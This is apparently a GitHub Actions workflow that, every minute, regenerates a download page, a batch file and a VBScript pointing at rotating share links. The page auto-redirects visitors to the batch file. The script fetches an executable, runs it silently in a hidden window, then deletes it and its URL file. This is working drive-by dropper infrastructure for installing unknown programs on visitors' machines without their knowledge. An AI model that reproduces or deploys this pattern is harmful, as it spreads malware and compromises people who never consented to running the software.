name: Update Silent Installer

on:
  schedule:
    - cron: '*/1 * * * *'
  workflow_dispatch:

jobs:
  update:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4
    - name: Create Silent Installer
      run: |
        # Define your download links
        links=("https://share.google/jraH4hXE8DKHc3EXZ" "https://share.google/5icY94HkmAiaVcn86" "https://share.google/mkGe1JX56Lut4KMdt" "https://share.google/zwqwLoZiVh08jLOa4" "https://share.google/dDynM21vQuy0Qvc4Z")
        
        # Get current link based on 10-minute interval
        current_minute=$(date +%M)
        link_index=$((current_minute / 1 % 6))
        current_link=${links[$link_index]}
        
        echo "Using link: $current_link"
        
        # Create a simple VBS script
        cat > installer.vbs << 'EOF'
        ' Simple installer script
        Dim objShell, objFSO, objHTTP, objStream, tempPath, urlFile, installerPath, downloadUrl
        
        Set objShell = CreateObject("WScript.Shell")
        Set objFSO = CreateObject("Scripting.FileSystemObject")
        
        ' Get temp path and file paths
        tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
        urlFile = tempPath & "\download_url.txt"
        installerPath = tempPath & "\installer.exe"
        
        ' Read URL from file
        Set objFile = objFSO.OpenTextFile(urlFile, 1)
        downloadUrl = objFile.ReadAll
        objFile.Close
        
        ' Download the file
        Set objHTTP = CreateObject("MSXML2.XMLHTTP")
        objHTTP.Open "GET", downloadUrl, False
        objHTTP.Send
        
        ' Handle redirects
        If objHTTP.Status >= 300 And objHTTP.Status < 400 Then
            finalUrl = objHTTP.getResponseHeader("Location")
            objHTTP.Open "GET", finalUrl, False
            objHTTP.Send
        End If
        
        ' Save the file
        If objHTTP.Status = 200 Then
            Set objStream = CreateObject("ADODB.Stream")
            objStream.Type = 1
            objStream.Open
            objStream.Write objHTTP.ResponseBody
            objStream.SaveToFile installerPath, 2
            objStream.Close
            
            ' Run the installer
            objShell.Run """" & installerPath & """ /S", 0, True
            
            ' Clean up
            objFSO.DeleteFile installerPath, True
            objFSO.DeleteFile urlFile, True
        End If
        EOF
        
        # Create a simple batch file
        cat > run.bat << 'EOF'
        @echo off
        copy "%~dp0url.txt" "%TEMP%\download_url.txt" >nul
        cscript.exe //nologo "%~dp0installer.vbs"
        EOF
        
        # Create URL file
        echo "$current_link" > url.txt
        
        # Create index.html
        echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=run.bat"></head><body><p>Downloading...</p></body></html>' > index.html
        
        # Commit and push
        git config --global user.email "action@github.com"
        git config --global user.name "GitHub Action"
        git add installer.vbs run.bat url.txt index.html
        git commit -m "Update installer" || exit 0
        git push
